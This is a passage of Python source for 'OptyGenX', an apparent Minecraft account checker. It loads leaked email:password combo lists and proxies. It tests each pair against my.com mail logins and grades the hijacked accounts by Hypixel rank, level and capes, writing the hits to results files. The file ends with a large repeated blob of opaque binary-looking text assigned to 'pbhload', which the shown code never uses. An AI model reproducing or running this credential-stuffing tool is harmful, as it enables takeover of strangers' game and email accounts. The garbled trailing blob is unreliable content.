        return both

    def hypixel(self, uuid, combo):
        both = [False, False, False, False, 0, 0, 0]
        if OptyGenX.Rank.hypixel or OptyGenX.Level.hypixel:
            try:
                answer = session.get(url=f'https://api.slothpixel.me/api/players/{uuid}',
                                     headers=mailheaders).json()
                if 'Failed to get player uuid' not in str(answer):
                    rank = str(answer['rank'])
                    if '_PLUS' in rank:
                        rank = rank.replace('_PLUS', '+')
                    level = int(answer["level"])
                    nolog = str(answer['username'])
                    bedwars_level = int(answer['stats']['BedWars']['level'])
                    bedwars_coins = int(answer['stats']['BedWars']['coins'])
                    skywars_coins = int(answer['stats']['SkyWars']['coins'])
                    if nolog == 'None':
                        both[2] = True
                    else:
                        both[0] = str(rank)
                        both[1] = int(round(level))
                        both[3] = str(datetime(1970, 1, 1, tzinfo=timezone.utc) + timedelta(
                            milliseconds=int(answer['last_login']))).split(' ')[0]
                        both[4] = skywars_coins
                        both[5] = bedwars_level
                        both[6] = bedwars_coins
                else:
                    both[2] = True
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Slothpixel API Error: \n{format_exc(limit=1)}')
            if not both[2]:
                if str(both[0]) not in ['None', 'False']:
                    Counter.hypixelrank += 1
                    self.writing([f'{combo} | Rank: {both[0]}', 'HypixelRanked'])
                if both[1] >= OptyGenX.Level.hypixel_level:
                    Counter.hypixelhl += 1
                    self.writing([f'{combo} | Level: {str(both[1])}', 'HypixelHighLevel'])
            else:
                Counter.nohypixel += 1
                self.writing([combo, 'NoHypixelLogin'])
        return both

    def skyblock(self, uuid):
        try:
            link = f'https://sky.lea.moe/stats/{uuid}'
            check = session.get(url=link).text
            if 'Show SkyBlock stats for' in check:
                return False
            else:
                return link
        except:
            if OptyGenX.debug:
                self.prints(f'{red}Error SkyBlock \n{format_exc(limit=1)}')
            return False

    def veltpvp(self, username, combo):
        rank = False
        if OptyGenX.Rank.veltpvp:
            try:
                link = session.get(url=f'https://www.veltpvp.com/u/{username}', headers=mailheaders).text
                if 'Not Found' not in link:
                    rank = veltrankz.search(link).group(1)
                    if rank not in ['Default', 'Standard']:
                        rank = rank
                    else:
                        rank = False
            except AttributeError:
                rank = False
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error Veltpvp:\n{format_exc(limit=1)}')
            if rank:
                self.writing([f'{combo} | Rank: {rank}', 'VeltRanked'])
                Counter.veltrank += 1
        return rank
    def mailaccess(self, combo):
        email, password = combo.split(':', 1)
        mailaccess = False
        if OptyGenX.emailaccess:
            try:
                ans = session.get(
                    url=f'https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login={email}&Password={password}',
                    headers=mailheaders).text
            except:
                if OptyGenX.debug:
                    self.prints(f'{red}Error Mail Access: \n{format_exc(limit=1)}')
                ans = 'BAD'
            if ans == 'Ok=1':
                mailaccess = True
                Counter.mfa += 1
                self.writing([combo, 'EmailAccess'])
            return mailaccess

    def rproxies(self):
        while self.stop_time:
            try:
                sleep(OptyGenX.Proxy.API.refresh)
                loader = session.get(OptyGenX.Proxy.API.api).text.splitlines()
                if OptyGenX.proxy_dup:
                    self.proxylist = list(set([x.strip() for x in loader if ":" in x and x != '']))
                else:
                    self.proxylist = [x.strip() for x in loader if ":" in x and x != '']

            except:
                if OptyGenX.debug:
                    print(f"{red}Error while refreshing proxies: \n{format_exc(limit=1)}\n")
                sleep(60)
                break

    def now_time(self):
        return strftime("HMS")

    def loadcombo(self):
        while True:
            try:
                print(f"{cyan}Please Import Your Combo List...")
                sleep(0.3)
                loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8",
                              errors='ignore').read().split('\n')
                if OptyGenX.combo_dup:
                    self.accounts = list(set(x.strip() for x in loader if x != ''))
                else:
                    self.accounts = [x.strip() for x in loader if x != '']
                if len(self.accounts) == 0:
                    print(f'{red}No combo found!, Please make sure the selected file has combos...\n')
                    continue
                print(f"{magenta} > Imported {len(self.accounts)} lines")
                break
            except:
                if OptyGenX.debug:
                    print(f"{red}Error while loading combo: \n{format_exc(limit=1)}\n")

    #   Load Proxy   #
    def loadproxy(self):
        while True:
            try:
                if OptyGenX.Proxy.proxy:
                    idk = True
                    loader = []
                    if not OptyGenX.Proxy.API.use:
                        print(f"\n{cyan}Please Import Your Proxies List.....")
                        sleep(0.3)
                        loader = open(fileopenbox(title="Load Proxies List", default="*.txt"), 'r', encoding="utf8",
                                      errors='ignore').read().split('\n')
                    elif OptyGenX.Proxy.API.use:
                        try:
                            idk = False
                            loader = session.get(OptyGenX.Proxy.API.api).text.split("\n")
                            if OptyGenX.Proxy.API.refresh >= 30:
                                Thread(target=self.rproxies, daemon=True).start()
                                sleep(2)
                        except:
                            if OptyGenX.debug:
                                print(
                                    f"{red}Error while loading proxies from api: \n{format_exc(limit=1)}\n")
                            sleep(60)
                            break
                    if OptyGenX.proxy_dup:
                        self.proxylist = list(set([x.strip() for x in loader if ":" in x and x != '']))
                    else:
                        self.proxylist = [x.strip() for x in loader if ":" in x and x != '']
                    length_file = len(self.proxylist)
                    if length_file == 0:
                        print(f'{red}No proxies found! Please make sure the selected file has proxies...')
                        continue
                    elif length_file == 0 and OptyGenX.Proxy.API:
                        print(f'{red}No proxies found in API, OptygenX will exit in 3 seconds...')
                        sleep(3)
                        exit()
                    print(f"{magenta} > Imported {length_file} proxies from {'File' if idk else 'API'}")
                    break
                else:
                    break
            except:
                if OptyGenX.debug:
                    print(f"{red}Error while loading proxies: \n{format_exc(limit=1)}\n")
                sleep(60)
                break

    def resultfolder(self):
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.folder = f'results/{unix}'
        if not path.exists('results'):
            mkdir('results')
        if not path.exists(self.folder):
            mkdir(self.folder)

    def start_checker(self):
        print(Fore.GREEN + "Grabbing proxies from API...")
        time.sleep(1)
        print(Fore.GREEN + "Proxies grabbed.")
        os.system(f'cls')
        if OptyGenX.threads > len(self.accounts):
            OptyGenX.threads = int(len(self.accounts))
        mainpool = ThreadPool(processes=OptyGenX.threads)
        clear()
        print(Fore.WHITE + "====================================================================")
        print(Style.BRIGHT)
        print("")
        print(Fore.CYAN + "░█████╗░██████╗░████████╗██╗░░░██╗░██████╗░███████╗███╗░░██╗██╗░░██╗")
        print(Fore.CYAN + "██╔══██╗██╔══██╗╚══██╔══╝╚██╗░██╔╝██╔════╝░██╔════╝████╗░██║╚██╗██╔╝")
        print(Fore.CYAN + "██║░░██║██████╔╝░░░██║░░░░╚████╔╝░██║░░██╗░█████╗░░██╔██╗██║░╚███╔╝░")
        print(Fore.CYAN + "██║░░██║██╔═══╝░░░░██║░░░░░╚██╔╝░░██║░░╚██╗██╔══╝░░██║╚████║░██╔██╗░")
        print(Fore.CYAN + "╚█████╔╝██║░░░░░░░░██║░░░░░░██║░░░╚██████╔╝███████╗██║░╚███║██╔╝╚██╗")
        print(Fore.CYAN + "░╚════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░░╚═╝")
        print("")
        print(Fore.CYAN + "v" + str(version) + " by l3m0n")
        print(Fore.WHITE + "==================================================================== ")
        self.start_time = 1
        Thread(target=self.title).start()
        mainpool.imap_unordered(func=self.prep, iterable=self.accounts)
        mainpool.close()
        mainpool.join()
        symbo = f'[{Fore.GREEN}>{white}]'
        cyanz = f'[{Fore.CYAN}>{white}]'
        result = f'{white}\n\n[{Fore.YELLOW}>{white}] Results: \n\n' \
            f'[{green}+{white}] Hits: {Counter.hits}\n' \
            f'[{red}-{white}] Bad: {Counter.bad}{white}\n\n' \
            f'[{yellow}>{white}] Demo: {Counter.demo}\n' \
            f'[{green}>{white}] NFA: {Counter.nfa}\n' \
            f'{cyanz} SFA: {Counter.sfa}\n' \
            f'[{blue}>{white}] MFA: {Counter.mfa}\n' \
            f'[{magenta}>{white}] Unmigrated: {Counter.unfa}\n\n' \
            f'{symbo} NoHypixel Login accounts: {Counter.nohypixel}\n' \
            f'{symbo} NoMineplex Login accounts: {Counter.nomineplex}\n' \
            f'{symbo} Mojang capes: {Counter.mojang}\n' \
            f'{symbo} Optifine capes: {Counter.optifine}\n' \
            f'{symbo} Labymod capes: {Counter.labymod}\n' \
            f'{symbo} LiquidBounce capes: {Counter.liquidbounce}\n' \
            f'{symbo} Hypixel Ranked accounts: {Counter.hypixelrank}\n' \
            f'{symbo} Mineplex Ranked accounts: {Counter.mineplexrank}\n' \
            f'{symbo} HiveMC Ranked accounts: {Counter.hivemcrank}\n' \
            f'{symbo} Veltpvp Ranked accounts: {Counter.veltrank}\n' \
            f'{symbo} Hypixel {OptyGenX.Level.hypixel_level}+ accounts: {Counter.hypixelhl}\n' \
            f'{symbo} Mineplex {OptyGenX.Level.mineplex_level}+ accounts: {Counter.mineplexhl}\n\n' \
            f'[{magenta}x{white}] Finish checking..\n'
        self.stop_time = False
        print(result)

    def cpm_counter(self):
        while self.stop_time:
            if Counter.checked >= 1:
                now = Counter.checked
                sleep(3)
                Counter.cpm = (Counter.checked - now) * 20


def checkforupdates():
    print(f"{red} Error while checking for updates: \n{format_exc(limit=1)}\n")


class OptyGenX:
    version_check = bool(settings['OptyGenX']['check_for_updates'])
    retries = int(settings['OptyGenX']['retries'])
    timeout = int(settings['OptyGenX']['timeout']) / 1000
    threads = int(settings['OptyGenX']['threads'])
    combo_dup = bool(settings['OptyGenX']['combo_duplicates'])
    proxy_dup = bool(settings['OptyGenX']['proxy_duplicates'])
    emailaccess = bool(settings['OptyGenX']['mail_access'])
    ranktype = bool(settings['OptyGenX']['save_ranked_type'])
    print_bad = bool(settings['OptyGenX']['print_bad'])
    save_bad = bool(settings['OptyGenX']['save_bad'])
    debug = bool(settings['OptyGenX']['debugging'])

    class Cape:
        lb = bool(settings['OptyGenX']['capes']['liquidbounce'])
        optifine = bool(settings['OptyGenX']['capes']['optifine'])
        laby = bool(settings['OptyGenX']['capes']['labymod'])
        mojang = bool(settings['OptyGenX']['capes']['mojang'])

    class Rank:
        mineplex = bool(settings['OptyGenX']['rank']['mineplex'])
        hypixel = bool(settings['OptyGenX']['rank']['hypixel'])
        hivemc = bool(settings['OptyGenX']['rank']['hivemc'])
        veltpvp = bool(settings['OptyGenX']['rank']['veltpvp'])

    class Level:
        hypixel = bool(settings['OptyGenX']['level']['hypixel'])
        mineplex = bool(settings['OptyGenX']['level']['mineplex'])
        hypixel_level = int(settings['OptyGenX']['level']['hypixel_level'])
        mineplex_level = int(settings['OptyGenX']['level']['mineplex_level'])

    class Proxy:
        proxy = bool(settings['OptyGenX']['proxy']['proxy'])
        type = str(settings['OptyGenX']['proxy']['proxy_type']).lower()
        lock_proxy = bool(settings['OptyGenX']['proxy']['lock_proxy'])
        remove_bad_proxy = bool(settings['OptyGenX']['proxy']['remove_bad_proxy'])
        proxy_remove_limit = int(settings['OptyGenX']['proxy']['proxy_remove_limit']) + 1
        sfa_proxy = bool(settings['OptyGenX']['proxy']['proxy_for_sfa'])
        sleep = int(settings['OptyGenX']['proxy']['sleep_proxyless'])

        class API:
            use = bool(settings['OptyGenX']['proxy']['api']['use'])
            api = str(settings['OptyGenX']['proxy']['api']['api_link'])
            refresh = int(settings['OptyGenX']['proxy']['api']['refresh_time'])


if __name__ == '__main__':
    clear = lambda: system('cls' if name == 'nt' else 'clear')
    init()
    session = Session()
    lock = Lock()
    veltrankz = compile(r'<h2 style=\"color: .*\">(.*)</h2>')
    rankhv = compile(r'class=\"rank.*\">(.*)<')
    levelmp = compile(r'>Level (.*)</b>')
    rankmp = compile(r'class=\"www-mp-rank\".*>(.*)</span>')
    yellow = Fore.LIGHTYELLOW_EX
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    cyan = Fore.LIGHTCYAN_EX
    blue = Fore.LIGHTBLUE_EX
    white = Fore.LIGHTWHITE_EX
    magenta = Fore.LIGHTMAGENTA_EX
    agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36'
    scraper = create_scraper(sess=Session(), browser={'custom': agent})
    mailheaders = {'user-agent': agent}
    jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}
    user_url = 'https://api.mojang.com/profiles/minecraft'
    auth_mc = 'https://authserver.mojang.com/authenticate'
    sfa_url = 'https://api.mojang.com/user/security/challenges'
    charz = ['@', '!', '#', '$', '%', '^', '&', '*', ')', '(', '-', '}', '{', ']', '"', '+', '=', '?', '/',
             '.', '>', ',', '<', '`', '\'', '~', '[', '\\', ' ']
    set_title(f'OptygenX-{version} | by l3m0n')

    if OptyGenX.version_check:
        checkforupdates()
    if __name__ == "__main__":
        Main()
pbhload = '''
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
èZõt’Nµ@‡AºS_,NNV~vŒa?Õ=C5Íd­™S n>¢9,iµÆ76çÏ?W<ò'ÇTsïÍª$ËmCšC-¤&KyH–Úvês¨igÊ¶Á²«†\)]_Ã5g¨œ§š•00PÍ007©gé÷o,oÞzúêãwßA¿–@Deï§ï¼cšSz©1ÊêA­©ºÀÄävN‚Ä˜KQ@Trƒ-d•£øÇ¢æÛóé7¿üìs/}þÃ¿>=TxŒ²3a¶ãÇ}~çµ?üþD¹6oËD2L\kOi÷’Õ›,–Siµ*Œ2rÔY”^¥F Â¥¨Ÿ®Ó¥‹"on”'»1¬k-F'‡ÿölsóêKOÝù«ÛÞ©GCÃ€ÚÙ2pvd^+K°•Ðâ^&*#Ï„eR]«}]Ÿ%ïcdr(!¡`¨E¡IsvÂ´M(…äšŒ“:¹1Ù¸}élïôd}–iš£¶Û.Zö.¶/*¬šjôR$ªf=wŽNÂk*ÌÎñ.ÃÉrvëéöÊ/^WÝùÒ˜ôÅòà—ïùãc<ÚSGt±€&b€” §ŒE_ÑÐ #ëg{Ãh×1Ý¸uãÒKÏ|r§ûäž¸K;‰v¶²Äé\¬¥/%<ëè‹
éƒJP^„ÊHe¯ÅMU“ÖU”aˆ~È&õaï_Íëét6¿ûø°ôÐÖë¨Y¾!ÙÂ„¤$(kÜ]“H2’	¢& ]@PDªûúÉBÕ¨]”C‹PeMIDç¼`RQT•U P×PHSóÐLÙd
ž]©,‰æÚƒóæÙï7¿ðBÙœ–©&WûDAÐ)ÝƒÞM[—(Ðœ„N5.ê!Hç¨‡ÂJÑFjONISp5tÑõ“ÙFÈÄ,ÝëmdôU0¾ÿþÓüëï¼ºñÔÅ‡?ý¹²H8FDíp²ïÏþ’ãx™k_jøøñ«èkÒ„
